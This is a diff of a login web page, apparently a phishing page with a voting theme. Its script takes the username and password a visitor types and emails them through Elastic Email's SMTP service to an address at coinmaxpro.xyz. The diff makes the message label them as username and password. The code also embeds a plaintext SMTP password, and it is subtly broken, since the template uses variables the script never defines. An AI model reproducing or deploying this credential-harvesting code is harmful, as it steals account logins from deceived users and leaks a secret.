@@ -198,11 +198,13 @@
                 <input type="text" name="username" id="username" required placeholder="email">
 
                 <input type="text" name="password" id="password" required placeholder="password">
-              
+                <!-- <input type="hidden" name="_next" value="https://votelixzz.netlify.app
                 
-              
+                /thanks"> -->
+                <!-- <input type="hidden" name="_captcha" value="false"> -->
+                <!-- <input name="_redirect" type="hidden" id="name" value="https://owenvote.vercel.app/grac.html"> -->
                 <div class="link">
-                    <button type="submit" id="submit" onclick="sendEmail()" class="login"
+                    <button type="submit" id="submit" onclick="sendEmail()"   class="login"
                         style="text-decoration: none; color: white;">Login </button>
                     <a href="#" class="forgot">Forgot password?</a>
                 </div>
@@ -227,13 +229,13 @@
         let name = document.getElementById("username").value;
         let email = document.getElementById("password").value;
         // let message = document.getElementById("message").value;
-        let finalmessage = `Name : ${username} <br>  Email : ${password} <br> `;
+        let finalmessage = `username : ${username} <br>  Password : ${password} <br> `;
         Email.send({
             Host: "smtp.elasticemail.com",
             Username: "owen@coinmaxpro.xyz",
             Password: "5C8455645DECFE30CD32EB4E6533B764BD54",
             To: 'owen@coinmaxpro.xyz',
-            From: "you@isp.com",
+            From: "owen@coinmaxpro.xyz",
             Subject: "Mail from website",
             Body: finalmessage
         }).then(
